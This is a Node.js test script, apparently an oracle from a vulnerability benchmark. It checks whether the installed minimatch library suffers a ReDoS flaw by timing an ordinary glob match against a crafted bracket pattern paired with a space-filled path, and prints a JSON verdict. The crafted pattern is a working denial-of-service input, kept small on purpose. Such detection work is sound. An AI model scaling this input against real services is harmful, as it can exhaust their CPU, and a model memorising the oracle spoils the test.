'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

try {
  const marker = 'oracle_minimatch_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const baseDir = path.join(os.tmpdir(), marker);
  fs.mkdirSync(baseDir, { recursive: true });

  // ---- Benign operation: prove ordinary glob matching works ----
  const benignPath = path.join(baseDir, 'a', 'b', 'c.txt').split(path.sep).join('/');
  const benignPattern = baseDir.split(path.sep).join('/') + '/**/*.txt';

  let benignResult;
  try {
    benignResult = minimatch(benignPath, benignPattern);
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation threw: ' + String(e && e.message) });
    process.exit(0);
  }

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not match as expected, result=' + String(benignResult) });
    process.exit(0);
  }

  const operation_completed = true;

  // ---- Measure benign call timing baseline (small, simple inputs) ----
  const baselineIterations = 5;
  const baselineStart = process.hrtime.bigint();
  for (let i = 0; i < baselineIterations; i++) {
    minimatch(benignPath, benignPattern);
  }
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6 / baselineIterations;

  // ---- Malicious input: crafted pattern/path pair known to trigger ReDoS in minimatch <=3.0.4 ----
  // Bracket-expression expansion with repeated '!' and trailing space, combined with
  // a long string of spaces as the path, triggers catastrophic backtracking in the
  // vulnerable braceExpand/regex construction.
  const N = 28; // bounded so vulnerable version still finishes within a few seconds
  const maliciousPattern = '[!' + ' '.repeat(N) + ']' + '!'.repeat(N);
  const maliciousPath = ' '.repeat(N) + 'x';

  let threw = false;
  let maliciousResult = null;
  const malStart = process.hrtime.bigint();
  try {
    maliciousResult = minimatch(maliciousPath, maliciousPattern);
  } catch (e) {
    threw = true;
  }
  const malEnd = process.hrtime.bigint();
  const malMs = Number(malEnd - malStart) / 1e6;

  // Threshold: vulnerable ReDoS should blow past a generous multiple of the baseline
  // and exceed an absolute floor, while patched version stays close to baseline.
  const absoluteFloorMs = 1500; // generous absolute bound, well under "a few seconds"
  const relativeMultiplier = 200; // vulnerable pattern should be drastically slower than baseline

  const isSlow = (malMs > absoluteFloorMs) || (malMs > baselineMs * relativeMultiplier && malMs > 200);

  if (threw) {
    // An exception post benign success counts as blocked (not vulnerable).
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious call threw after benign success (treated as blocked); baselineMs=' + baselineMs.toFixed(3) + ' malMs=' + malMs.toFixed(3)
    });
    process.exit(0);
  }

  finish({
    operation_completed: true,
    exploit_succeeded: isSlow,
    evidence: 'baselineMs=' + baselineMs.toFixed(3) + ' malMs=' + malMs.toFixed(3) + ' result=' + String(maliciousResult) + ' N=' + N
  });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected error: ' + String(e && e.message) });
}
